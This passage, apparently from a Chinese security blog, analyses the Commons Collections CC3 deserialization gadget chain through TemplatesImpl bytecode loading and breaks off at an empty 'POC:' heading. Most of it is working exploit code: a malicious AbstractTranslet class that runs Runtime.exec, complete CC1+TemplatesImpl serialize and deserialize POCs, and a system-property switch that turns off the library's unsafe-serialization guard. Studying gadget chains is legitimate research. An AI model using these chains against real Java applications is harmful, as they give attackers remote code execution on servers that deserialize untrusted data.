<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field filed = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">filed.setAccessible(true);</span><br><span class="line">filed.set(templates, &quot;字节码&quot;);</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">        public Object run() &#123;</span><br><span class="line">            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>

<p>或者是直接加载远程或者本地class文件：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\Coding\\Java\\CC\\target\\classes\\EvilTemplatesImpl.class&quot;));</span><br><span class="line">       byte[][] codes = &#123;code&#125;;</span><br><span class="line">       setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span><br></pre></td></tr></table></figure></div>



<p>其实效果都是一样的。</p>
<p>然后是一个run方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">        public Object run() &#123;</span><br><span class="line">            return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>

<p>这里有一个<code>_tfactory</code>，因为用到了这个参数所以我们要给这个参数赋值，不然这里就会报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802171846688.png"
                      alt="image-20230802171846688"
                ></p>
<p><code>transient</code> 关键字是 Java 中的一个修饰符，用于标记变量，表示该变量在对象的序列化过程中不会被持久化，即不会被写入到字节流中，从而在反序列化后该变量的值会被重新初始化。</p>
<p>所以说我们这里给这个参数去赋值时没有意义的，因为当他在被反序列化的时候又被重新初始化了。<br>那我们直接跟进到readobject中去看一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802172251738.png"
                      alt="image-20230802172251738"
                ></p>
<p>可以看到在反序列化的时候是会给这个参数赋值的</p>
<p>但是我们这里要使用这个参数</p>
<p>所以我们这里可以通过反射随便给它赋值，因为无论我们赋什么值，这里在反序列化的时候的值是不会改变的</p>
<p>然后我们这里为了方便直接赋值<code>new TransformerFactoryImpl</code>，方便我们后面调试，因为我们利用链到这里还不会进行反序列化，所以我们这里先赋值给它。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field filed = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">filed.setAccessible(true);</span><br><span class="line">filed.set(templates, &quot;new TransformerFactoryImpl&quot;);</span><br></pre></td></tr></table></figure></div>

<p>然后我们这里为了简化代码，直接把反射修改属性值这一部分代码定义一个函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">    Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    filed.setAccessible(true);</span><br><span class="line">    filed.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么到这里我们的POC可以编写为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class cc3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(&quot;字节码base64编码&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么正常情况下，我们这里应该已经可以正常进行命令执行</p>
<p>那么我们这里编写一个命令执行的恶意代码类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后编译一下把字节码base64编码一下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class bianma &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String filePath = &quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class\\&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] classBytes = readClassFile(filePath);</span><br><span class="line">            String base64Encoded = convertToBase64(classBytes);</span><br><span class="line">            System.out.println(base64Encoded);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static byte[] readClassFile(String filePath) throws IOException &#123;</span><br><span class="line">        try (FileInputStream fis = new FileInputStream(filePath);</span><br><span class="line">             ByteArrayOutputStream baos = new ByteArrayOutputStream()) &#123;</span><br><span class="line">            byte[] buffer = new byte[4096];</span><br><span class="line">            int bytesRead;</span><br><span class="line">            while ((bytesRead = fis.read(buffer)) != -1) &#123;</span><br><span class="line">                baos.write(buffer, 0, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            return baos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String convertToBase64(byte[] data) &#123;</span><br><span class="line">        return Base64.getEncoder().encodeToString(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们直接把我们的POC运行一下：</p>
<p>但是并没有执行命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175110466.png"
                      alt="image-20230802175110466"
                ></p>
<p>然后是报了一个空指针错误在defineTranslectClasses里面</p>
<p>但是这个不太好找</p>
<p>然后我们这里打断点跟进调试一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175023651.png"
                      alt="image-20230802175023651"
                ></p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175259884.png"
                      alt="image-20230802175259884"
                ></p>
<p>然后我们可以看到这里类加载是已经成功了</p>
<p>然后我们继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175419393.png"
                      alt="image-20230802175419393"
                ></p>
<p>然后我们可以看到就是在这个if判断里面报了一个空指针错误</p>
<p>然后这个if就是检查我们传入字节码是不是<code>ABSTRACT_TRANSLET</code>的子类</p>
<p>然后是的话会对<code>_transletIndex</code>进行一个赋值，不是的话，就会跳转到我们报空指针错误的地方</p>
<p>那我们这里解决办法有两个：</p>
<p>1、给_auxCLasses赋值，解决这个空指针报错</p>
<p>2、使if判断为真也就是我们传入的字节码为<code>ABSTRACT_TRANSLET</code>的子类</p>
<p>但是我们往下看还有一个if判断：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (_transletIndex &lt; 0) &#123;</span><br><span class="line">             ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">             throw new TransformerConfigurationException(err.toString());</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里也就是<code>_transletIndex</code> 值小于0就直接抛出异常</p>
<p>而且我们现在的<code>_transletIndex</code> 值是-1</p>
<p>所以我们给_auxCLasses赋值不可行，因为这样无法过第二个if，仍然会报错</p>
<p>所以我们这里要使我们传入的字节码为<code>ABSTRACT_TRANSLET</code>的子类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802180950718.png"
                      alt="image-20230802180950718"
                ></p>
<p>跟进到这个类里面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802180931720.png"
                      alt="image-20230802180931720"
                ></p>
<p>可以看到这个类是一个抽象类，那他的子类就要实现它的抽象方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802181053462.png"
                      alt="image-20230802181053462"
                ></p>
<p>所以我们构造的恶意类就要实现这个transform抽象方法</p>
<p>那我们这里重新构造一个恶意类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123;</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers)</span><br><span class="line">            throws TransletException &#123;&#125;</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator,</span><br><span class="line">                          SerializationHandler handler) throws TransletException &#123;&#125;</span><br><span class="line">    public HelloTemplatesImpl() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们的POC就可以构造为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class blog &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802181259643.png"
                      alt="image-20230802181259643"
                ></p>
<p>可以看到已经成功运行了。</p>
<h2 id="CC1-TemplatesImpl"><a href="#CC1-TemplatesImpl" class="headerlink" title="CC1+TemplatesImpl"></a>CC1+TemplatesImpl</h2><p>上面我们已经可以通过TemplatesImpl加载字节码进行任意命令执行了。</p>
<p>但是我们要想利用这个攻击链</p>
<p>就要在反序列化的时候调用<code>newTransform</code>方法。</p>
<p>其实这里就可以和我们前面CC1的分析结合起来</p>
<p>我们在CC1利用链的分析中是通过<code>InvokerTransform</code>类方法实现调用传进的方法：</p>
<p>我们这里回顾一下CC1中关于<code>InvokerTransform</code>的利用：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        new ConstantTransformer(templates),</span><br><span class="line">        new InvokerTransformer(&quot;newTransformer&quot;, null, null)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">map.put(&quot;value&quot;, &quot;value&quot;);</span><br></pre></td></tr></table></figure></div>

<p>我们这里是通过InvokerTransformer在反序列化的时候调用transform方法通过反射获取到exec方法进行命令执行</p>
<p>那我们这里只有把exec方法换成我们要执行的<code>newTransform</code>方法就可以实现对后续利用链的利用</p>
<p>具体原理我们在CC1中已经分析了，我们这里就不详细分析了:</p>
<p>直接构造POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class blog &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">      //  templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null, null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null,chainedTransformer);</span><br><span class="line">        transformedMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802182913889.png"
                      alt="image-20230802182913889"
                ></p>
<p>可以看到我们这里成功执行了</p>
<p>后面的就和CC1中的一样了，把动态代理补上去就可以通过反序列化触发整条利用链了。</p>
<p>补齐后的POC为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class blog &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">      //  templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null, null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>但是报错了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802183427731.png"
                      alt="image-20230802183427731"
                ></p>
<p>意思大概就是说<code>org.apache.commons.collections.functors.InvokerTransformer</code> 的序列化支持因安全原因而被禁用。这是 Apache Commons Collections 为了防止与反序列化不受信任的数据相关的潜在安全漏洞而实施的安全措施。要启用 <code>InvokerTransformer</code> 的序列化支持，你可以将系统属性 <code>org.apache.commons.collections.enableUnsafeSerialization</code> 设置为 <code>true</code>。（本机测试）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br></pre></td></tr></table></figure></div>

<p>那么我们最终的POC为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class blog &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">      //  templates.newTransformer();</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;, null, null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor annotationInvocationdhdlConstructor =c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(true);</span><br><span class="line">        Object o=annotationInvocationdhdlConstructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serializable(o);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802183709542.png"
                      alt="image-20230802183709542"
                ></p>
<h2 id="InstantiateTransformer-TemplatesImpl"><a href="#InstantiateTransformer-TemplatesImpl" class="headerlink" title="InstantiateTransformer+TemplatesImpl"></a>InstantiateTransformer+TemplatesImpl</h2><p>我们上面那条链也就是通过<code>InvokerTransform</code>的transform方法将CC1与后面动态加载字节码的利用联系起来</p>
<p>但是在ysoserial中用的是另一种方法.</p>
<p>它这里并没有用<code>InvokerTransform</code>类，而是用的<code>InstantiateTransformer</code>这个类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802185851623.png"
                      alt="image-20230802185851623"
                ></p>
<p>这条链其实用的这个类里面的调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public TrAXFilter(Templates templates)  throws</span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = new TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>可以看到这个是在这个类的构造函数里面调用了newTransformer()方法，而且传参也是可控的</p>
<p>我们只需将这个类实例化，并且参数传进构造好的 templates 即可，那么我们只要可以调用TrAXFilter的构造函数，我们就可以调用我们后续的利用链</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802190243263.png"
                      alt="image-20230802190243263"
                ></p>
<p>但是现在有一个问题就是我们可以看到这个类也是没有继承序列化接口的，那这个类是不能被序列化的</p>
<p>那我们如果还想要要利用的话，就要和我们在CC1获取runtime对象一样，通过它的class入手</p>
<p>然后ysoserial中的就是通过InstantiateTransformer这个类来解决这个问题的</p>
<p>我们跟进到这个类看一下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (input instanceof Class == false) &#123;</span><br><span class="line">            throw new FunctorException(</span><br><span class="line">                &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span><br><span class="line">                    + (input == null ? &quot;null object&quot; : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor con = ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        return con.newInstance(iArgs);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我们这里看一下它的transform方法</p>
<p>首先这里if里面会加检查输入的是不是CLass类型的对象</p>
<p><code>Constructor con = ((Class) input).getConstructor(iParamTypes);</code>: 这段代码获取 <code>input</code> 类对象的构造函数。它首先将 <code>input</code> 强制转换为 <code>Class</code> 类型，然后使用 <code>getConstructor(...)</code> 方法获取构造函数。在这里，<code>iParamTypes</code> 是一个类的参数类型数组，用于标识构造函数的参数类型。</p>
<p><code>return con.newInstance(iArgs);</code>: 这段代码通过获取的构造函数实例化一个对象并返回。它使用 <code>newInstance(...)</code> 方法来创建类的新实例，<code>iArgs</code> 是一个包含实例化对象所需的构造函数参数的数组。</p>
<p>总的来说，这段代码实现了一个能够通过反射实例化对象的 <code>Transformer</code>。它要求传入的 <code>input</code> 必须是一个 <code>Class</code> 类型的对象，并且通过提供的构造函数参数类型数组和参数值数组来创建类的新实例。</p>
<p>他这里会返回实例化的对象，那么这刚好符合我们的要求</p>
<p>构造：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">InstantiateTransformer instantiateTransformer=new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125; );</span><br><span class="line">instantiateTransformer.transform( TrAXFilter.class);</span><br></pre></td></tr></table></figure></div>

<p>我们这里就调用了<code>instantiateTransformer</code>方法并且把我们要实例化的类TrAXFilter传了进去</p>
<p>因为TrAXFilter是不能序列化，但是它的class是可以序列化的，然后我们这里通过<code>instantiateTransformer</code>获取到了它的实例化对象</p>
<p>那么这样就可以触发<code>instantiateTransformer</code>的构造函数进而触发我们后续利用链：</p>
<p>POC：</p>
